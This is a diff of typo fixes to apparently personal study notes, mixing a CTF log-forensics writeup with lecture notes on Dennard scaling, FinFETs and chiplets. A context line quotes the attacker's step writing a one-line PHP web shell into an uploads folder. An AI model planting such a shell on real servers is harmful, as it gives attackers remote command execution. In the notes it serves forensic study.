@@ -12,7 +12,7 @@ parent: holmes_ctf_2025
 - **Challenge points** : 1800
 Given waf.log (web application firewall), application and access logs.
 Logs show victim,  Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 was attacked.
-Seems attacker requested some backup tar, and sql dump, and upload configurations, and that allowed it to get access to 
+Seems the attacker requested some backup tar, a SQL dump, and upload configurations, and that allowed them to get access
 
 ```
 ls -la /var/www/html
@@ -23,8 +23,8 @@ echo "<?php system($_GET[\"cmd\"]); ?>" > /var/www/html/uploads/temp_4A4D.php
 Using BurpSuite
 
 Dennard Scaling
-Scale transistor dimensions and oeprating voltage by a factor lambda
-Gate delay scles as lambda
+Scale transistor dimensions and operating voltage by a factor lambda
+Gate delay scales as lambda
 
 Clock frequency scales as 1/delay
 
@@ -32,37 +32,38 @@ Energy per signal transitions scales as lambda^3
 Power is energy over time. Power scales as lambda^2
 Number of devices on a chip scales as lambda ^-2
 
-Power density, watts per centimer is constant
+Power density, watts per centimeter, is constant
 
 Conclusion: everything gets way better as we shrink transistors
 
 precise manufacturing
 
--> we cant just keep lowering volatage, transistor in off state creates energy barrier for electrons moving from source to drain
+-> we can't just keep lowering voltage; a transistor in off state creates an energy barrier for electrons moving from source to drain
 
 Must be many times larger than random thermal energy, or transistor will leak
 Operating voltage must be around 0.6 volts or more
 
-Chips are faster than they should be  by Dennard scaling, but way hotter
+Chips are faster than they should be by Dennard scaling, but way hotter
 
-Electrons can quantum tunnel through glass seperating transsitor
+Electrons can quantum tunnel through the glass separating transistors
 
-Make glass from hafnium oxide
+Make the glass from hafnium oxide
 
-Gate doesnt control electric field in trnasistor strongly enough
-- wrap gtae around channel, FinFETs, Gate ALL Around FETs
-- 
-Transistor is tool small for doping to work righ, There arent enough aoms
+The gate doesn't control the electric field in the transistor strongly enough
+- wrap the gate around the channel: FinFETs, Gate All Around FETs
+
+Transistors are too small for doping to work right, there aren't enough atoms
 
 
 Scaling:
 
 Better than silicon:
-- Chiplets - many smaller chhips on single ceramic, M series CPU, GPUS
-- Stacking memeory chips
-- Liquid nitrogren? Silicon photonics
+- Chiplets — many smaller chips on a single ceramic, M series CPUs, GPUs
+- Stacking memory chips
+- Liquid nitrogen? Silicon photonics
 
 
-Lasers and glass fibre, optical interoconncet is better at distances
+Lasers and glass fibre, optical interconnect is better at distances
+
 
  Encase/FTK/The Sleuth Kit/Volatility
